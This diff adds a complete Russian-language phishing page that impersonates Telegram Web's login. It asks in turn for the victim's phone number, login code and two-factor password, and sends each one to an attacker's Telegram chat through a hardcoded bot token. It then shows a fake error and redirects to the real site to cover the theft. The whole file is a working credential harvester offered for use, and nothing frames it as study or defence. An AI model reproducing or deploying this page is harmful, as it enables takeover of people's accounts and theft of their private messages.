@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Web</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #2AABEE 0%, #229ED9 100%);
+            font-family: Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .box {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            width: 300px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #2AABEE;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="box" id="step1">
+        <h2>Telegram</h2>
+        <p>Введите номер телефона</p>
+        <input type="text" id="phone" placeholder="+7 999 123-45-67">
+        <button onclick="sendPhone()">Далее</button>
+    </div>
+
+    <div class="box hidden" id="step2">
+        <h2>Код подтверждения</h2>
+        <p>Введите код из Telegram</p>
+        <input type="text" id="code" placeholder="12345">
+        <button onclick="sendCode()">Войти</button>
+    </div>
+
+    <div class="box hidden" id="step3">
+        <h2>Пароль</h2>
+        <p>Введите пароль двухфакторной защиты</p>
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="sendPassword()">Продолжить</button>
+    </div>
+
+    <script>
+        let userPhone = '';
+        const BOT_TOKEN = '8286343612:AAEr8TWIda-YFjqik5lH0BIHR101B9IQgfw';
+        const CHAT_ID = '6859514384';
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+        }
+
+        function sendPhone() {
+            userPhone = document.getElementById('phone').value;
+            sendToTelegram('📱 Номер: ' + userPhone);
+            
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            sendToTelegram('🔑 Код: ' + code + ' (для номера ' + userPhone + ')');
+            
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+        }
+
+        function sendPassword() {
+            const password = document.getElementById('password').value;
+            sendToTelegram('🔒 Пароль 2FA: ' + password + ' (для номера ' + userPhone + ')');
+            
+            alert('Ошибка! Попробуйте позже');
+            window.location.href = 'https://web.telegram.org';
+        }
+    </script>
+</body>
+</html>
